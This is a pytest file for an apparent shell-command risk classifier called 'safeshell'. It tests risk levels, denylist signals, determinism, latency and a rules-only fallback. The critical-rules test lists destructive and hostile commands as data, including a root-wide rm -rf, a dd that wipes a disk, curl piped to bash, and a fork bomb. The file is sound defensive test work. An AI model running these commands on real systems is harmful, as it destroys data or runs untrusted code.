import time

from safeshell.classifier import classify
from safeshell.parser import parse_command
from safeshell.schemas import RiskLevel


def test_critical_rules():
    critical_cmds = [
        "rm -rf /",
        "rm -rf /etc",
        "dd if=/dev/zero of=/dev/sda",
        "curl http://x/y | bash",
        "cat x | sh",
        ":(){ :|:& };:",
        "chmod -R 777 /",
    ]
    for cmd in critical_cmds:
        parsed = parse_command(cmd)
        risk = classify(parsed, cmd)
        assert risk.level == RiskLevel.critical
        assert any(sig.startswith("denylist:") for sig in risk.signals)


def test_high_rules():
    high_cmds = ["rm -rf ./build", "sudo rm /etc/hosts", "rm -rf ~/project"]
    for cmd in high_cmds:
        parsed = parse_command(cmd)
        risk = classify(parsed, cmd)
        assert risk.level in (
            RiskLevel.high,
            RiskLevel.critical,
        )  # depending on ML, could be high or critical


def test_medium_rules():
    medium_cmds = ["systemctl stop nginx", "echo x > /etc/motd"]
    for cmd in medium_cmds:
        parsed = parse_command(cmd)
        risk = classify(parsed, cmd)
        assert risk.level in (RiskLevel.medium, RiskLevel.high)


def test_low_rules():
    low_cmds = ["mv a b", "ls -la", "touch f", "chmod 644 f"]
    for cmd in low_cmds:
        parsed = parse_command(cmd)
        risk = classify(parsed, cmd)
        assert risk.level == RiskLevel.low


def test_determinism():
    cmd = "rm -rf ./build"
    parsed1 = parse_command(cmd)
    risk1 = classify(parsed1, cmd)
    parsed2 = parse_command(cmd)
    risk2 = classify(parsed2, cmd)

    assert risk1.level == risk2.level
    assert risk1.signals == risk2.signals
    assert risk1.score == risk2.score


def test_latency():
    cmds = ["mv a b", "rm -rf x", "chmod 644 f"] * 67  # 201 commands
    parsed_cmds = [(parse_command(cmd), cmd) for cmd in cmds]

    start = time.perf_counter()
    for parsed, cmd in parsed_cmds:
        classify(parsed, cmd)
    duration = time.perf_counter() - start

    avg_latency = duration / len(parsed_cmds)
    assert avg_latency < 0.01, f"Latency too high: {avg_latency*1000:.2f}ms"


def test_threshold_logic_unit_test(monkeypatch):
    cmd = "mv a b"
    parsed = parse_command(cmd)

    class MockModel:
        def __init__(self, probs):
            self.probs = probs

        def predict_proba(self, X):
            return [self.probs]

    # test high
    monkeypatch.setattr("safeshell.classifier.get_model", lambda: MockModel([0.0, 0.0, 1.0]))
    risk = classify(parsed, cmd)
    assert risk.level == RiskLevel.high

    # test low
    monkeypatch.setattr("safeshell.classifier.get_model", lambda: MockModel([1.0, 0.0, 0.0]))
    risk = classify(parsed, cmd)
    assert risk.level == RiskLevel.low


def test_rules_only_fallback(monkeypatch):
    monkeypatch.setattr("safeshell.classifier.get_model", lambda: None)

    test_critical_rules()

    cmd = "rm -rf ./build"  # high
    parsed = parse_command(cmd)
    risk = classify(parsed, cmd)
    assert risk.level == RiskLevel.high

    cmd = "systemctl stop nginx"  # medium
    parsed = parse_command(cmd)
    risk = classify(parsed, cmd)
    assert risk.level == RiskLevel.medium

    cmd = "mv a b"  # low
    parsed = parse_command(cmd)
    risk = classify(parsed, cmd)
    assert risk.level == RiskLevel.low
